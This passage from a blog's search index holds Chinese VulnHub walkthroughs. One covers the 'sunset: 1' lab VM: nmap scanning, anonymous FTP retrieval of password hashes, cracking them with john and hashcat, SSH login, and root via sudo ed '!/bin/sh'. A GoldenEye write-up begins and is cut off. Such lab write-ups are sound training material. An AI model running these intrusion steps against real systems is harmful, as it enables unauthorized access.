        <category>python</category>
      </categories>
      <tags>
        <tag>开发环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[sunset-1]</title>
    <url>/2020/04/14/sunset-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：sunset: 1<br>发布日期：2019年7月29日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>sunset.zip</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhQUdaVTFDNkoheV9QYzBCRUoyRXNBRmlCZVVZOTFzNGU5bWdybG84c040YVQzd0tWZW42cw==">https://mega.nz/#!AGZU1C6J!y_Pc0BEJ2EsAFiBeUY91s4e9mgrlo8sN4aT3wKVen6s<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3Vuc2V0LnppcA==">https://download.vulnhub.com/sunset/sunset.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3Vuc2V0LnppcC50b3JyZW50">https://download.vulnhub.com/sunset/sunset.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>N/A</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.123</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:89:F0:14 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -p- -sV 192.168.56.123</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.5.5</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 21,22 -v -A -T4 --script=vuln 192.168.56.123</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.5.5</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>通过尝试发现可以通过anonymous用户登录ftp</p>
<h3 id="列举"><a href="#列举" class="headerlink" title="列举"></a>列举</h3><p>不出所料，尝试使用匿名用户登录ftp，并成功完成了此操作，此后在那里获得了一个名为“ backup”的文件。首先将该文件保存在系统中，然后打开该文件并得到五个用户的哈希值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># ftp 192.168.56.123</span></span><br><span class="line">Connected to 192.168.56.123.</span><br><span class="line">220 pyftpdlib 1.5.5 ready.</span><br><span class="line">Name (192.168.56.123:root): anonymous</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-r--r--   1 root     root         1062 Jul 29  2019 backup</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; get backup</span><br><span class="line"><span class="built_in">local</span>: backup remote: backup</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">1062 bytes received <span class="keyword">in</span> 0.01 secs (135.0579 kB/s)</span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># ls</span></span><br><span class="line">backup</span><br><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># cat backup </span></span><br><span class="line">CREDENTIALS:                                                                                                                                                                                                       </span><br><span class="line">office:<span class="variable">$6</span>$<span class="variable">$9ZYTy</span>.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  </span><br><span class="line">datacenter:<span class="variable">$6</span>$<span class="variable">$3QW</span>/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              </span><br><span class="line">sky:<span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     </span><br><span class="line">sunset:<span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/</span><br><span class="line">space:<span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/</span><br></pre></td></tr></table></figure>

<p>复制这些hash并将其保存在名为hash的文件中，然后将在crack工具john的帮助下破解用户“sunset”找到密码“ cheer14”的hash。下一步使用此用户名和密码通过ssh连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># john hash</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;HMAC-SHA256&quot;</span>, but the string is also recognized as <span class="string">&quot;HMAC-SHA512&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=HMAC-SHA512&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: only loading hashes of <span class="built_in">type</span> <span class="string">&quot;HMAC-SHA256&quot;</span>, but also saw <span class="built_in">type</span> <span class="string">&quot;sha512crypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=sha512crypt&quot;</span> option to force loading hashes of that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Warning: Only 10 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 11 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 29 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 20 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 26 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 29 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 8 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 16 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 31 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Warning: Only 15 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Further messages of this <span class="built_in">type</span> will be suppressed.</span><br><span class="line">To see less of these warnings, <span class="built_in">enable</span> <span class="string">&#x27;RelaxKPCWarningCheck&#x27;</span> <span class="keyword">in</span> john.conf</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure>

<p>john太慢，半天出不了结果，如果电脑显卡配置好的话，可以如下选用rockyou.txt字典并使用hashcat来破解密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 5 digests; 5 unique digests, 2 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Uses-64-Bit</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344367</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line">* Runtime...: 3 secs</span><br><span class="line"></span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space</span><br><span class="line"><span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14</span><br><span class="line">Cracking performance lower than expected?</span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password- and salt-length (typically down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Update your OpenCL runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky</span><br><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: sha512crypt <span class="variable">$6</span>$, SHA512 (Unix)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Wed Apr 15 10:29:47 2020 (59 secs)</span><br><span class="line">Time.Estimated...: Wed Apr 15 10:42:31 2020 (11 mins, 45 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:    18801 H/s (10.91ms) @ Accel:64 Loops:32 Thr:32 Vec:1</span></span><br><span class="line">Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts</span><br><span class="line">Progress.........: 2162688/28688720 (7.54%)</span><br><span class="line">Rejected.........: 0/2162688 (0.00%)</span><br><span class="line">Restore.Point....: 1081344/14344360 (7.54%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:640-672</span></span><br><span class="line">Candidates.<span class="comment">#1....: 496580 -&gt; 145263w</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: sha512crypt <span class="variable">$6</span>$, SHA512 (Unix)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Wed Apr 15 10:29:47 2020 (14 mins, 9 secs)</span><br><span class="line">Time.Estimated...: Wed Apr 15 10:43:56 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:    16929 H/s (10.62ms) @ Accel:64 Loops:32 Thr:32 Vec:1</span></span><br><span class="line">Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts</span><br><span class="line">Progress.........: 28688720/28688720 (100.00%)</span><br><span class="line">Rejected.........: 0/28688720 (0.00%)</span><br><span class="line">Restore.Point....: 14344360/14344360 (100.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:1 Amplifier:0-1 Iteration:4992-5000</span></span><br><span class="line">Candidates.<span class="comment">#1....: $HEX[284d4f544f29333136] -&gt; $HEX[042a0337c2a156616d6f732103]</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Wed Apr 15 10:29:17 2020</span><br><span class="line">Stopped: Wed Apr 15 10:43:58 2020</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub255.jpg"></li>
</ul>
<p>使用下面的命令查看已经破解的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt --show</span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space</span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky</span><br><span class="line"><span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14</span><br></pre></td></tr></table></figure>

<p>得到三个已经破解的用户和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">space    space</span><br><span class="line">sky      sky</span><br><span class="line">sunset   cheer14</span><br></pre></td></tr></table></figure>

<h3 id="利用然后进一步提权"><a href="#利用然后进一步提权" class="headerlink" title="利用然后进一步提权"></a>利用然后进一步提权</h3><p>使用用户Sunset通过ssh登录，并在其中找到了名为user.txt的文件，并在其中再次获得了hash文件。</p>
<p>现在，检查哪个文件具有sudo权限，并且发现ed是sudoers的成员。</p>
<p>因此，执行！/bin/sh命令，并获得root访问权限。</p>
<p>以root用户身份登录后，再次找到了一个名为flag.txt的文件；</p>
<p>获得最后的flag。已经成功获得了root访问权限并通关了这个CTF box。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh sunset@192.168.56.123</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.123 (192.168.56.123)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:n9ATwmONo6fCyPblqlvcO7WcIWZJMqBaqDdo/jYnLPI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.123<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">sunset@192.168.56.123&#x27;</span>s password: </span><br><span class="line">Linux sunset 4.19.0-5-amd64 <span class="comment">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182</span><br><span class="line">sunset@sunset:~$ id</span><br><span class="line">uid=1000(sunset) gid=1000(sunset) groups=1000(sunset),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)</span><br><span class="line">sunset@sunset:~$ whoami</span><br><span class="line">sunset</span><br><span class="line">sunset@sunset:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">sunset@sunset:~$ cat user.txt</span><br><span class="line">5b5b8e9b01ef27a1cc0a2d5fa87d7190</span><br><span class="line">sunset@sunset:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sunset on sunset:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sunset may run the following commands on sunset:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/ed</span><br><span class="line">sunset@sunset:~$ sudo /usr/bin/ed</span><br><span class="line">id</span><br><span class="line">?</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/sunset</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt  ftp  server.sh</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">25d7ce0ee3cbf71efbac61f85d0c14fe</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub256.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>ftp anonymous用户免密码登录</li>
<li>john破解linux sha512 hash值</li>
<li>hashcat破解linux sha512 hash值</li>
<li>sudo无需密码ed通过!/bin/sh提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[GoldenEye-1]</title>
    <url>/2020/01/08/GoldenEye-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：GoldenEye：1<br>发布日期：2018年5月4日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU03bU1kU01ISHBpRktXM0pMcXE4Ym9Ockk5NU52NHRx">https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YQ==">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YS50b3JyZW50">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：中级</p>
<p>最近完成了创建OSCP型易受攻击的计算机的工作，该计算机的主题是伟大的James Bond电影（甚至更好的n64游戏）GoldenEye。目标是root并捕获秘密的GoldenEye代码-flag.txt。我认为它是中级的，它具有root所需的多种技术-没有漏洞利用开发/缓冲区溢出。在完成OSCP之后，我认为这将是一个不错的实践，另外还有一点CTF风味。我已经在VMware和VirtualBox上创建并验证。除了默认情况下，您不需要其他工具。将需要设置为“host only”，并且在VMware上，由于格式化，在最初启动它时，如果出现提示，可能需要单击“重试”。</p>
<p>Beta-2018-05-02 v1-2018-05-04</p>
<p>GoldenEye是由creosote发起并在Vulnhub举办的一项以秘密服务为主题的挑战。GoldenEye是一个CTF样式的框，而不是现实的渗透测试方案。此框需要相当多的“即开即用”的思想，才能找到根源。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -n -Pn -v -sV 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br></pre></td></tr></table></figure>
<p>除了在端口80上运行的Web应用程序之外，还有两个pop3端口和一个smtp端口。建议使用主应用程序导航到/sev-home/。但是，该应用程序在浏览到/sev-home/时提示输入用户名和密码，而我对凭证还一无所知。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 25,80,55006,55007 -A -v -Pn -n -sV -T5 --script=vuln --min-rate=10000 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_128_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:74733  CVE:CVE-2015-4000</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic 